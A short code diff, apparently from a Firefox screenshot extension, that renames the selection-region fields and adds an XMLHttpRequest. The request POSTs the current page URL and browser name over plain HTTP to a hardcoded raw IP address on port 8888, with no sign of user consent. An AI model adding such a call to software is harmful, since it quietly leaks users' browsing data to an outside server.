@@ -118,14 +118,18 @@ function SaveScreenshot(aLeft, aTop, aWidth, aHeight, aFormat) {
 
 function CreateMessage(top,left,height,width) {
   var message = {
-    "boundary_left": left,
-    "boundary_top":top,
-    "boundary_height":height,
-    "boundary_width":width,
+    "x": left,
+    "y":top,
+    "height":height,
+    "width":width,
     "URL":document.URL,
     "browser":"firefox"
   };
   console.log(message)
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'http://94.154.12.234:8888');
+  xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
+  xhr.send(JSON.stringify(message));
 
 }
 
